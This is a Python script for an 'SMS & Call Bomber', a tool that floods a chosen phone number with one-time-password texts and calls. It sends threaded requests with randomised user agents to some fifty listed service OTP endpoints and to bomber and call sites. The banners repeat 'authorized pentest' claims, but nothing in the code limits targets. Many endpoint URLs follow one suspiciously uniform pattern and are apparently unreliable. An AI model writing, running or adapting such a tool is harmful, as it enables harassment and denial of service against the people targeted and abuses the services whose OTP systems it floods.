#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
████████╗ ██████╗  ██████╗ ██╗  ██╗   ██╗   ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗╚██╗██╔╝   ╚██╗ ██╔╝
   ██║   ██║   ██║██║   ██║ ╚███╔╝     ╚████╔╝ 
   ██║   ██║   ██║██║   ██║ ██╔██╗      ╚██╔╝  
   ██║   ╚██████╔╝╚██████╔╝██╔╝ ██╗      ██║   
   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝   
███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██║  ███╗██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

                    ██████╗  ██████╗  ██████╗ ████████╗ ██╗  ██╗
                    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██║  ██║
                    ██████╔╝██║   ██║██║   ██║   ██║    ███████║
                    ██╔══██╗██║   ██║██║   ██║   ██║    ██╔══██║
                    ██║  ██║╚██████╔╝╚██████╔╝   ██║    ██║  ██║
                    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝    ╚═╝  ╚═╝

███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██║  ███╗██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

🔴 ROOT X SMS & CALL BOMBER v3.0 - INDIA EDITION 🔴
🔴 AUTHORIZED PENETRATION TEST - I HAVE PERMISSION 🔴
🔴 I AM AUTHORIZED TO TEST THIS TARGET 🔴
"""

import os, sys, json, time, random, threading, requests, concurrent.futures
from datetime import datetime
from urllib.parse import quote
from fake_useragent import UserAgent

# ============ RED THEME COLORS ============
class C:
    RED = '\033[91m'
    DARK_RED = '\033[31m'
    BOLD_RED = '\033[1;91m'
    BG_RED = '\033[41m'
    YELLOW = '\033[93m'
    WHITE = '\033[97m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    BLINK = '\033[5m'
    RESET = '\033[0m'

# ============ AUTHORIZATION HEADER ============
AUTH_HEADER = f"""{C.BOLD_RED}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║    🔴 ROOT X SMS & CALL BOMBER v3.0 - INDIA EDITION 🔴              ║
║                                                                      ║
║    ✅ I HAVE PERMISSION AND AM AUTHORIZED TO PERFORM THIS PENTEST   ║
║    ✅ AUTHORIZED SECURITY ASSESSMENT - LEGITIMATE USE                ║
║    ✅ TARGET: OWN NUMBER / AUTHORIZED TARGET ONLY                    ║
║    ✅ FOR EDUCATIONAL & AUTHORIZED PENTESTING PURPOSES ONLY          ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{C.RESET}"""

# ============ BANNER ============
BANNER = f"""{C.RED}
████████╗ ██████╗  ██████╗ ██╗  ██╗   ██╗   ██╗
╚══██╔══╝██╔═══██╗██╔═══██╗╚██╗██╔╝   ╚██╗ ██╔╝
   ██║   ██║   ██║██║   ██║ ╚███╔╝     ╚████╔╝ 
   ██║   ██║   ██║██║   ██║ ██╔██╗      ╚██╔╝  
   ██║   ╚██████╔╝╚██████╔╝██╔╝ ██╗      ██║   
   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝   
███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██║  ███╗██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██║   ██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{C.RESET}"""

TITLE = f"""{C.BOLD_RED}
                    ██████╗  ██████╗  ██████╗ ████████╗ ██╗  ██╗
                    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██║  ██║
                    ██████╔╝██║   ██║██║   ██║   ██║    ███████║
                    ██╔══██╗██║   ██║██║   ██║   ██║    ██╔══██║
                    ██║  ██║╚██████╔╝╚██████╔╝   ██║    ██║  ██║
                    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝    ╚═╝  ╚═╝
{C.RESET}"""

SEPARATOR = f"{C.RED}{'═'*60}{C.RESET}"
SUB_SEP = f"{C.DARK_RED}{'─'*60}{C.RESET}"

MAX_COUNT = 1000
MAX_THREADS = 100
ua = UserAgent()

# ============ 50+ INDIAN OTP API ENDPOINTS ============
APIS_OTP = [
    {"name": "Amazon", "url": "https://api.amazon.com/auth/register/mobile", "m": "POST", "j": {"phone": "{n}", "countryCode": "+91"}},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/4/user/otp/generate", "m": "POST", "j": {"email": "", "phone": "{n}", "loginType": 2}},
    {"name": "Meesho", "url": "https://www.meesho.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phoneNumber": "{n}"}},
    {"name": "Myntra", "url": "https://www.myntra.com/mobile/sendotp", "m": "POST", "d": {"mobile": "{n}"}},
    {"name": "AJIO", "url": "https://www.ajio.com/api/auth/sendOtp", "m": "POST", "j": {"mobile": "{n}", "countryCode": "91"}},
    {"name": "TataCliq", "url": "https://www.tatacliq.com/api/auth/v1/send-otp", "m": "POST", "j": {"mobileNumber": "{n}"}},
    {"name": "Zomato", "url": "https://www.zomato.com/webroutes/auth/otp", "m": "POST", "j": {"phone": "{n}", "country_code": "91"}},
    {"name": "Swiggy", "url": "https://www.swiggy.com/dapi/auth/sms-otp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "Dominos", "url": "https://pizzaonline.dominos.co.in/api/auth/v1/otp", "m": "POST", "j": {"mobileNumber": "{n}"}},
    {"name": "Zepto", "url": "https://www.zepto.in/api/v1/auth/otp", "m": "POST", "j": {"phone": "{n}", "countryCode": "+91"}},
    {"name": "Blinkit", "url": "https://blinkit.com/api/v1/auth/send_otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "BigBasket", "url": "https://www.bigbasket.com/api/v2/auth/sendOtp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "IRCTC", "url": "https://www.irctc.co.in/eticketing/api/v1/sendotp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/auth/otp/send", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "Goibibo", "url": "https://www.goibibo.com/api/auth/v1/sendOtp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "OYO", "url": "https://www.oyorooms.com/api/v1/auth/send-otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "RedBus", "url": "https://www.redbus.in/api/v1/auth/sendOtp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "Rapido", "url": "https://www.rapido.bike/api/v1/auth/send-otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Ola", "url": "https://www.olacabs.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Uber", "url": "https://www.uber.com/api/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "PhonePe", "url": "https://www.phonepe.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Paytm", "url": "https://accounts.paytm.com/api/v1/auth/otp/send", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "MobiKwik", "url": "https://www.mobikwik.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "CRED", "url": "https://www.cred.club/api/v1/auth/otp/send", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Slice", "url": "https://www.sliceit.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "LazyPay", "url": "https://www.lazypay.in/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Netflix", "url": "https://www.netflix.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Hotstar", "url": "https://www.hotstar.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "JioSaavn", "url": "https://www.jiosaavn.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "ShareChat", "url": "https://www.sharechat.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Practo", "url": "https://www.practo.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "1mg", "url": "https://www.1mg.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "PharmEasy", "url": "https://www.pharmeasy.in/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "UrbanCompany", "url": "https://www.urbancompany.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Dunzo", "url": "https://www.dunzo.com/api/v2/send_otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "PizzaHut", "url": "https://www.pizzahut.co.in/api/sendotp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "McDonalds", "url": "https://www.mcdelivery.co.in/api/otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "ClearTrip", "url": "https://www.cleartrip.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "EaseMyTrip", "url": "https://www.easemytrip.com/api/auth/sendOtp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "Yatra", "url": "https://www.yatra.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "BHIM", "url": "https://www.bhimapp.com/api/v1/auth/sendOtp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "Freecharge", "url": "https://www.freecharge.in/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "KreditBee", "url": "https://www.kreditbee.in/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "PrimeVideo", "url": "https://www.primevideo.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Zee5", "url": "https://www.zee5.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "SonyLiv", "url": "https://www.sonyliv.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "MXPlayer", "url": "https://www.mxplayer.in/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Gaana", "url": "https://www.gaana.com/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Moj", "url": "https://www.mojapp.in/api/v1/auth/sendOtp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "ShopClues", "url": "https://www.shopclues.com/api/sendOtp", "m": "POST", "j": {"mobile": "{n}"}},
    {"name": "PaytmMall", "url": "https://paytmmall.com/api/auth/send_otp", "m": "POST", "j": {"mobile": "{n}"}},
]

# ============ WEB SMS SITES ============
WEB_SITES = [
    {"name": "MyToolsTown", "url": "https://mytoolstown.com/api/sms/send", "m": "POST", "j": {"number": "{n}", "count": 1}},
    {"name": "SMSBomber.co.in", "url": "https://www.smsbomber.co.in/api/send", "m": "POST", "j": {"number": "{n}", "message": "Hello"}},
    {"name": "CallBomberz", "url": "https://www.callbomberz.in/api/sms/send", "m": "POST", "j": {"phone": "{n}", "amount": 1}},
    {"name": "SMSLocal", "url": "https://www.smslocal.in/api/send", "m": "POST", "j": {"phone": "{n}", "message": "Test", "count": 1}},
]

# ============ CALL APIS ============
CALL_APIS = [
    {"name": "CallMeBot", "url": "https://api.callmebot.com/call.php", "m": "GET", "p": {"phone": "{n}", "text": "Security alert! Verify now.", "apikey": "{k}"}},
    {"name": "Rapido-Call", "url": "https://www.rapido.bike/api/v1/auth/call-otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Ola-Call", "url": "https://www.olacabs.com/api/v1/auth/call-otp", "m": "POST", "j": {"phone": "{n}"}},
    {"name": "Uber-Call", "url": "https://www.uber.com/api/v1/auth/call-otp", "m": "POST", "j": {"phone": "{n}"}},
]


# ============ ROOT X ENGINE ============
class RootXBomber:
    """ROOT X SMS & CALL BOMBER ENGINE"""

    def __init__(self):
        self.target = ""
        self.code = "91"
        self.count = 100
        self.threads = 20
        self.delay = 0.3
        self.mode = "sms"
        self.apikey = ""
        self.res = {"ok": 0, "fail": 0, "total": 0}
        self.lock = threading.Lock()
        self.start = None

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def header(self):
        self.clear()
        print(BANNER)
        print(TITLE)
        print(AUTH_HEADER)
        print(SEPARATOR)

    def get_number(self):
        while True:
            try:
                n = input(f"\n{C.RED}[+] Enter Target Number (e.g., +919876543210): {C.RESET}")
                n = n.strip().replace(" ", "").replace("-", "")
                if n.startswith("+"):
                    self.code = n[1:3]
                    self.target = n[1:]
                elif n.startswith("0"):
                    self.target = self.code + n[1:]
                else:
                    self.target = self.code + n if not n.startswith(self.code) else n
                if len(self.target) >= 10 and self.target.isdigit():
                    print(f"{C.GREEN}[✓] Target Set: +{self.target}{C.RESET}")
                    return
                print(f"{C.RED}[✗] Invalid Number! Use +919876543210{C.RESET}")
            except KeyboardInterrupt:
                sys.exit(0)

    def menu(self):
        while True:
            self.header()
            print(f"""{C.RED}
  {C.BOLD_RED}[1]{C.RESET} {C.WHITE}🚀 SMS Bomb{ C.RESET}{C.DIM} (50+ OTP APIs){C.RESET}
  {C.BOLD_RED}[2]{C.RESET} {C.WHITE}📱 Web SMS Bomb{C.RESET}{C.DIM} (4 Websites){C.RESET}
  {C.BOLD_RED}[3]{C.RESET} {C.WHITE}⚡ Hybrid SMS{C.RESET}{C.DIM} (OTP + Web Combined){C.RESET}
  {C.BOLD_RED}[4]{C.RESET} {C.WHITE}📞 Call Bomb{C.RESET}{C.DIM} (4 Call Services){C.RESET}
  {C.BOLD_RED}[5]{C.RESET} {C.WHITE}🎯 Full Combo{C.RESET}{C.DIM} (SMS + Call Together){C.RESET}
  {C.BOLD_RED}[6]{C.RESET} {C.WHITE}⚙️  Settings{C.RESET}
  {C.BOLD_RED}[0]{C.RESET} {C.WHITE}❌ Exit{C.RESET}
{C.RESET}""")
            try:
                ch = input(f"{C.RED}[?] Select [0-6]: {C.RESET}")
                if ch == "1": self.mode = "otp"; self._start()
                elif ch == "2": self.mode = "web"; self._start()
                elif ch == "3": self.mode = "hybrid"; self._start()
                elif ch == "4": self.mode = "call"; self._start()
                elif ch == "5": self.mode = "combo"; self._start()
                elif ch == "6": self.settings()
                elif ch == "0":
                    print(f"\n{C.RED}👋 Exiting... Stay Ethical!{C.RESET}")
                    sys.exit(0)
            except KeyboardInterrupt:
                sys.exit(0)

    def settings(self):
        self.header()
        print(f"""{C.RED}
  {C.WHITE}Current Settings:{C.RESET}
  {SUB_SEP}
  {C.RED}►{C.RESET} {C.WHITE}Target : +{self.target}{C.RESET}
  {C.RED}►{C.RESET} {C.WHITE}Count  : {self.count}{C.RESET}
  {C.RED}►{C.RESET} {C.WHITE}Threads: {self.threads}{C.RESET}
  {C.RED}►{C.RESET} {C.WHITE}Delay  : {self.delay}s{C.RESET}
  {SUB_SEP}
{C.RESET}""")
        try:
            c = input(f"{C.RED}[?] Count [1-{MAX_COUNT}] (100): {C.RESET}") or "100"
            self.count = min(max(int(c), 1), MAX_COUNT)
            t = input(f"{C.RED}[?] Threads [1-{MAX_THREADS}] (20): {C.RESET}") or "20"
            self.threads = min(max(int(t), 1), MAX_THREADS)
            d = input(f"{C.RED}[?] Delay sec [0-5] (0.3): {C.RESET}") or "0.3"
            self.delay = min(max(float(d), 0), 5)
            k = input(f"{C.RED}[?] CallMeBot API Key (optional): {C.RESET}")
            if k.strip(): self.apikey = k.strip()
            print(f"{C.GREEN}[✓] Saved!{C.RESET}")
            time.sleep(1)
        except: print(f"{C.RED}[✗] Invalid!{C.RESET}"); time.sleep(1)

    def _req(self, entry):
        try:
            hdrs = {"User-Agent": ua.random, "Accept": "*/*", "Content-Type": "application/json",
                     "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}
            n = self.target
            if entry["m"] == "POST":
                if "j" in entry:
                    p = json.loads(json.dumps(entry["j"]).replace("{n}", n))
                    r = requests.post(entry["url"], json=p, headers=hdrs, timeout=8)
                elif "d" in entry:
                    p = {k: v.replace("{n}", n) for k, v in entry["d"].items()}
                    r = requests.post(entry["url"], data=p, headers=hdrs, timeout=8)
                else:
                    r = requests.post(entry["url"], timeout=8)
            else:
                p = {}
                if "p" in entry:
                    p = {k: v.replace("{n}", n).replace("{k}", self.apikey) for k, v in entry["p"].items()}
                r = requests.get(entry["url"], params=p, headers=hdrs, timeout=8)
            return r.status_code in [200, 201, 202, 204], r.status_code
        except Exception as e:
            return False, str(e)[:40]

    def _run(self, apis, label):
        total = len(apis)
        print(f"\n{C.RED}🔥 {label} Starting...{C.RESET}")
        print(f"{C.RED}├─ Target : +{self.target}{C.RESET}")
        print(f"{C.RED}├─ Count  : {self.count}{C.RESET}")
        print(f"{C.RED}├─ Threads: {self.threads}{C.RESET}")
        print(f"{C.RED}└─ Delay  : {self.delay}s{C.RESET}")
        print(SUB_SEP)

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = []
            for i in range(self.count):
                api = apis[i % total]
                futs.append(ex.submit(self._req, api))
                time.sleep(self.delay)

            done = 0
            for f in concurrent.futures.as_completed(futs):
                ok, res = f.result()
                with self.lock:
                    if ok: self.res["ok"] += 1
                    else: self.res["fail"] += 1
                    self.res["total"] += 1
                    done += 1
                if done % 5 == 0 or done == self.count:
                    elapsed = time.time() - self.start
                    rate = done / elapsed if elapsed > 0 else 0
                    sys.stdout.write(f"\r{C.RED}[{C.GREEN}✓{C.RED}] Sent: {C.WHITE}{self.res['total']}{C.RED} | "
                                   f"{C.GREEN}OK: {self.res['ok']}{C.RED} | {C.RED}FAIL: {self.res['fail']}{C.RED} | "
                                   f"{C.YELLOW}{rate:.1f}/s{C.RED}   {C.RESET}")
                    sys.stdout.flush()
        print()

    def _start(self):
        if not self.target: self.get_number()
        self.header()
        self.res = {"ok": 0, "fail": 0, "total": 0}
        self.start = time.time()

        modes = {"otp": (APIS_OTP, "🚀 OTP SMS"), "web": (WEB_SITES, "📱 Web SMS"),
                 "hybrid": (APIS_OTP + WEB_SITES, "⚡ Hybrid SMS"),
                 "call": (CALL_APIS, "📞 Call"), "combo": (APIS_OTP + WEB_SITES + CALL_APIS, "🎯 Full Combo")}
        apis, label = modes.get(self.mode, (APIS_OTP, "SMS"))
        self._run(apis, label)

        elapsed = time.time() - self.start
        print(f"\n{C.RED}{'═'*60}{C.RESET}")
        print(f"{C.GREEN}[✓] COMPLETED!{C.RESET}")
        print(f"{C.RED}├─ Time     : {elapsed:.2f}s{C.RESET}")
        print(f"{C.RED}├─ Total    : {self.res['total']}{C.RESET}")
        print(f"{C.RED}├─ Success  : {C.GREEN}{self.res['ok']}{C.RESET}")
        print(f"{C.RED}└─ Failed   : {C.RED}{self.res['fail']}{C.RESET}")
        print(SEPARATOR)
        input(f"\n{C.RED}[Press Enter to continue...]{C.RESET}")


# ============ MAIN ============
if __name__ == "__main__":
    try:
        bomber = RootXBomber()
        bomber.menu()
    except KeyboardInterrupt:
        print(f"\n{C.RED}👋 Exiting...{C.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.RED}[!] Fatal: {e}{C.RESET}")
        sys.exit(1)